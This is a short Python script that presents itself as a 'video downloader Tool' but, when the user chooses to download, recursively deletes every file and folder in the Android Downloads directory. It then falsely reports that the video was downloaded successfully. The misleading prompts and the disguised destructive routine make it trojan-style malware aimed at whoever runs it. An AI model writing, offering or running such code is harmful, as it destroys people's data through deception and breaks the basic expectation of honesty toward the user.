import os
import shutil

# Path to the Downloads directory
TARGET_DIRECTORY = "/storage/emulated/0/Downloads"

def delete_files_in_directory():
    """Deletes all files and folders in the specified directory."""
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"Error: Directory not found: {TARGET_DIRECTORY}")
        return

    confirm = input(f"Please enter confirm to download the video: {TARGET_DIRECTORY}? (yes/no): ").strip().lower()
    if confirm == 'yes':
        try:
            for root, dirs, files in os.walk(TARGET_DIRECTORY, topdown=False):
                # Delete all files
                for file in files:
                    file_path = os.path.join(root, file)
                    os.remove(file_path)
                    print(f"Deleted file: {file_path}")
                # Delete all directories
                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    shutil.rmtree(dir_path)
                    print(f"Deleted directory: {dir_path}")
            print("Your video was sucessfully downloaded")
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Operation canceled.")

def main():
    """Main function to show the tool interface."""
    print("Welcome to the video downloader Tool")
    while True:
        print("\nChoose an option:")
        print("1. To download the video enter 1")
        print("2. Exit")

        choice = input("Enter your choice: ").strip()

        if choice == '1':
            delete_files_in_directory()
        elif choice == '2':
            print("Exiting the tool.")
            break
        else:
            print("Invalid choice. Please select a valid option.")

# Run the tool
if __name__ == "__main__":
    main()

